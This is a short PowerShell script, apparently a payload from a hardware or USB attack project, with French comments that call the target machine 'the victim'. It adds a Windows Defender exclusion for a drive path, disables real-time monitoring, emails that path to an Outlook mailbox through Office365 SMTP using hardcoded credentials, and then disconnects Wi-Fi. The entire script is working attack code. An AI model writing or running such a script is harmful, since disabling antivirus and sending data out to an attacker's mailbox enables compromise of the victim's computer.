$letter = $args[0]
Set-MpPreference -ExclusionPath $letter; Set-MpPreference -DisableRealtimeMonitoring $True
# Récupère le Path de la Pi sur la victime et l'envoi par mail
$p = ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force; 
$cred = New-Object System.Management.Automation.PSCredential ("EMAIL@outlook.com", $p);
Send-MailMessage -From 'Hackable <tb_gd_heig@outlook.com>' -To 'Hackable <tb_gd_heig@outlook.com>' -Subject 'Path' -Body "$letter" -Priority High -SmtpServer 'smtp.office365.com' -UseSsl -port 587 -Credential $cred
netsh wlan disconnect
